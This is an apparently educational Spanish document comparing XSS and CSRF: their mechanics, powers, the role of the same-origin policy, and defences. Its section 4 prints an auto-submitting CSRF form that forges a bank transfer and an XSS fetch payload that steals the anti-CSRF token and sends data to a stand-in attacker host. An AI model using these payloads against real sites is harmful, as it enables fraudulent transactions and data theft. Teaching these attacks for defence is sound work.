# Objetivo 3: XSS vs CSRF — Comparación Técnica Directa

## Introducción

Ambos ataques involucran al navegador de la víctima y ambos buscan afectar su cuenta, pero sus **mecánicas son opuestas**. Este documento compara técnicamente **Cross-Site Scripting (XSS)** y **Cross-Site Request Forgery (CSRF)**: qué hace cada uno, contra qué confía cada uno, y por qué sus defensas son casi inversas.

---

## 1. La diferencia fundamental en una frase

> - **XSS**: el atacante **ejecuta código en el navegador de la víctima** dentro del sitio confiable → obtiene **control total** de la sesión.
> - **CSRF**: el atacante **no ejecuta nada** en el navegador de la víctima → solo la **engaña para que su navegador envíe una petición** al sitio donde ya está autenticada.

| | **XSS** | **CSRF** |
|--|---------|----------|
| **Qué hace el atacante** | Inyecta y ejecuta JavaScript en el origen de la aplicación | Forja una petición que el navegador de la víctima envía con sus credenciales |
| **Qué obtiene** | Control total del DOM, cookies, acciones arbitrarias | **Una sola acción** predefinida (transferir, cambiar email, crear admin) |
| **Qué necesita** | Un punto donde la app inserte su input como código | Que la víctima tenga sesión activa y visite su página |
| **Confía en** | Que la app **no separe datos de código** | Que el navegador **envía cookies automáticamente** |

---

## 2. Mecánica de cada ataque

### XSS: el atacante ejecuta su propio código

**Flujo:**

1. El atacante inyecta un payload (ej. `<img src=x onerror=...>`) en un campo que la app renderiza sin codificar (comentario, biografía, parámetro URL).
2. La víctima carga la página (o hace clic en un enlace, según el tipo).
3. El navegador de la víctima **ejecuta el JavaScript del atacante en el origen de la aplicación**.
4. Desde ese momento, el atacante "es" la aplicación en ese navegador: puede leer `document.cookie`, leer el DOM, hacer `fetch()` a cualquier endpoint con la sesión de la víctima, keylogging, formularios falsos...

**La vulnerabilidad de fondo:** la aplicación **mezcla datos con código** (falta output encoding / hay sinks inseguros). Es una falla de la **aplicación**.

**El poder:** total dentro del origen. El atacante puede hacer *cualquier* acción que la víctima pueda hacer, y además *leer* las respuestas (ve los datos de la víctima).

### CSRF

**Flujo:**

1. La víctima tiene sesión activa en `banco.com` (cookie automática).
2. Visita `malo.com`, que contiene un formulario oculto o `<img>` hacia `banco.com`.
3. El navegador **envía la petición automáticamente con la cookie de sesión** — el atacante no ejecuta código, solo *provoca* la petición.
4. El servidor, que solo ve credenciales válidas, ejecuta la acción.

**La vulnerabilidad de fondo:** el servidor **no verifica el origen** de la petición; confía en que toda petición con cookie válida fue iniciada por el usuario.

**El poder del atacante:** limitado a **una acción predefinida** (la que él armó en su página). No puede leer la respuesta (la SOP se lo impide), no puede ver el resultado, no puede encadenar acciones dinámicas. Es un ataque "a ciegas": dispara y espera que el efecto ocurra en el servidor.

---

## 3. La comparación técnica directa

| Aspecto | XSS | CSRF |
|---------|-----|------|
| **Mecanismo** | Inyecta código que se ejecuta en el navegador | Provoca una petición que el navegador envía con credenciales |
| **Ejecución de código** | Sí — JavaScript arbitrario en el origen de la app | No — no hay código del atacante en el contexto del sitio |
| **Qué controla el atacante** | Todo: cookies, DOM, peticiones, respuestas | Solo el contenido de una petición fija |
| **Rol de la víctima** | Su navegador ejecuta el código del atacante | Su navegador envía una petición que ella no autorizó |
| **Requiere sesión activa** | No necesariamente (aunque la explota si existe) | **Sí, imprescindible** |
| **Requiere interacción** | Stored: ninguna; Reflejado/DOM: un clic | Stored: ninguna; Reflejado: un clic |
| **Dónde ocurre** | En el navegador, dentro del origen de la app | En el servidor (la petición llega y se procesa) |
| **Qué viola** | Confidencialidad + Integridad (lee y escribe todo) | Integridad (acciones no autorizadas); no lee la respuesta |
| **Defensa principal** | Output encoding + CSP | SameSite + token anti-CSRF + verificación de Origin |
| **Quién "culpa"** | La app (no separa datos de código) | El navegador (cookies automáticas) + el servidor (no verifica origen) |

### La diferencia en una frase

> **En el XSS, el atacante se convierte en la aplicación** (ejecuta código en su contexto).
> **En el CSRF, el atacante usa a la aplicación como herramienta** — nunca entra, solo hace que la víctima dispare la petición.

### La relación inversa entre ambos

Curiosidad técnica importante: **un XSS exitoso anula las defensas CSRF**, pero no al revés:

- Con XSS, el atacante ejecuta JS en el origen → puede **leer el token anti-CSRF** del DOM y hacer peticiones con él → el CSRF está "resuelto".
- Con CSRF, el atacante **no puede leer nada** (la SOP bloquea la lectura cross-origin) → solo dispara acciones ciegas.

Por eso se dice que **XSS subsume CSRF**: si tenés XSS, el CSRF es un subproducto. Pero no al revés — un CSRF no da acceso al contenido de la sesión.

### El rol de la SOP en cada ataque

- **En CSRF, la SOP es el límite del ataque**: el atacante no puede leer la respuesta (por eso solo puede *actuar*, no *ver*). Pero también es el aliado de la defensa: el token anti-CSRF es seguro precisamente porque el atacante no puede leerlo.
- **En XSS, la SOP es el premio**: al ejecutar JS en el origen de la app, el atacante **hereda sus privilegios** y la SOP deja de protegerlo — todo el origen es suyo.

---

## 4. Ejemplo paralelo: el mismo objetivo, dos caminos

**Objetivo: hacer que la víctima transfiera dinero.**

**Vía CSRF** (sin ejecutar código):

```html
<!-- En malo.com, la víctima visita y esto se auto-envía -->
<form action="https://banco.com/transferir" method="POST">
  <input type="hidden" name="monto" value="10000">
  <input type="hidden" name="destino" value="atacante">
</form>
<script>document.forms[0].submit()</script>
```

El navegador envía el POST con la cookie → el banco ejecuta. El atacante **no sabe** si funcionó (no puede leer la respuesta).

**Vía XSS** (con ejecución de código):

```js
// JS ejecutado en el origen de banco.com (vía Stored XSS en un comentario)
fetch("/api/transferir", {
  method: "POST",
  credentials: "include",
  headers: { "Content-Type": "application/json",
             "X-CSRF-Token": document.querySelector('[name=csrf]').value },
  body: JSON.stringify({ destino: "atacante", monto: 99999 })
})
.then(r => r.json())
.then(data => fetch("https://atacante.com/exfil", {method:"POST", body: JSON.stringify(data)}));
```

El XSS **lee el token anti-CSRF** (está en el DOM), lo incluye en la petición y además **lee la respuesta** — cosas que el CSRF puro no puede hacer. El XSS es estrictamente más poderoso, pero requiere un punto de inyección de código; el CSRF solo requiere que la víctima tenga sesión y visite el sitio equivocado.

---

## 5. Resumen final

| | XSS | CSRF |
|--|-----|------|
| **En una frase** | "Ejecuto mi código en tu navegador, en el contexto del sitio" | "Tu navegador dispara una petición que tú nunca autorizaste" |
| **Arma** | JavaScript inyectado | La cookie de sesión automática del navegador |
| **Alcance** | Control total del contexto (leer + escribir) | Una acción puntual (solo escribir, sin leer) |
| **Defensa clave** | Output encoding + CSP | SameSite + token anti-CSRF + verificación de origen |

> **Conclusión:** ambos ataques usan al navegador de la víctima como campo de batalla, pero con mecánicas opuestas: el **XSS ejecuta código del atacante dentro del sitio** (violando la separación dato/código), mientras que el **CSRF dispara peticiones desde fuera sin ejecutar nada** (explotando la confianza del servidor en las cookies). Por eso sus defensas son casi opuestas también: contra XSS se codifica la salida y se restringe la ejecución (CSP); contra CSRF se verifica el origen y se controla cuándo viajan las cookies (SameSite, tokens). Y la relación más peligrosa: **un XSS habilita CSRF** (puede leer el token), pero un CSRF nunca da el control que da un XSS.
